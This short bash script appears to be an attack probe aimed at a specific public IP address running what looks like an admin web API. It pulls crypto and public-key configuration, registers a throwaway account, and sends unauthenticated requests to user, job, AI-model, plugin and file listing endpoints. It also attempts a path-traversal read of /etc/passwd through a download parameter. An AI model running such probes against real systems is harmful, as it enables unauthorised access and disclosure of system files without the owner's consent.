#!/bin/bash
set +e
echo "### START $(date -u +%FT%TZ)"
B=http://123.184.7.135/prod-api
echo "### CRYPTO"
for p in /transport/crypto/frontend-config /transport/crypto/public-key /transport/crypto/monitor; do
  echo "-- $p"; timeout 10 curl -s -m 8 -o /tmp/o -w "code=%{http_code} len=%{size_download}\n" "$B$p"; head -c 700 /tmp/o; echo
done
echo "### REGISTER"
timeout 10 curl -s -m 8 -X POST "$B/register" -H 'Content-Type: application/json' -d '{"username":"ul5512","password":"Ul5512!pass","code":"","uuid":""}' -w "|%{http_code}\n" | head -c 300; echo
echo "### AUTHZ-PROBE"
for p in /system/user/list /monitor/job/list /ai/model/list /system/plugin/list /common/download?fileName=/etc/passwd /system/file/list; do
  echo "P $p => $(timeout 8 curl -s -m 6 -o /tmp/o -w '%{http_code}' "$B$p") :: $(head -c 120 /tmp/o|tr '\n' ' ')"
done
echo "### END $(date -u +%FT%TZ)"
